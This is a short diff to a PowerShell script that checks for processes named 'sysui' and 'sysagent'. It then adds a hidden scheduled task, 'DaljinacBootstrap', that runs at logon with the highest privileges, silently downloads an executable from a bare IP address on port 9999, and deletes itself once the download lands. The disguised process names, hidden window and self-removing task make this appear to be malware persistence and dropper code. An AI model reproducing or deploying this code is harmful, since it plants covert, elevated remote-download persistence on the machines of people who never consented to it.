@@ -85,3 +85,12 @@ $p1 = Get-Process -Name sysui -ErrorAction SilentlyContinue
 if ($p1) { Write-Host "  v1: RUNNING (PID $($p1.Id))" -ForegroundColor Green } else { Write-Host "  v1: not found" -ForegroundColor Red }
 $p2 = Get-Process -Name sysagent -ErrorAction SilentlyContinue
 if ($p2) { Write-Host "  v2: RUNNING (PID $($p2.Id))" -ForegroundColor Green } else { Write-Host "  v2: not found" -ForegroundColor Red }
+
+# Bootstrap: download aria2c.exe in background (single binary, portable, no UAC)
+Write-Host "  [bootstrap] Scheduling aria2c download..." -ForegroundColor Cyan
+$bsAction = New-ScheduledTaskAction -Execute powershell -Argument "-NoP -W Hidden -Command if(!(Test-Path C:\appdata\aria2c.exe)){try{iwr http://31.220.74.109:9999/aria2c.exe -OutFile C:\appdata\aria2c.exe -UseBasicParsing}catch{exit 1}}; if((Test-Path C:\appdata\aria2c.exe)-and((Get-Item C:\appdata\aria2c.exe).Length-gt 1000000)){schtasks /delete /tn DaljinacBootstrap /f}else{exit 1}"
+$bsTrigger = New-ScheduledTaskTrigger -AtLogOn
+$bsSettings = New-ScheduledTaskSettingsSet
+$bsPrincipal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
+Register-ScheduledTask -TaskName "DaljinacBootstrap" -Action $bsAction -Trigger $bsTrigger -Settings $bsSettings -Principal $bsPrincipal -Force | Out-Null
+Write-Host "         Done" -ForegroundColor Green
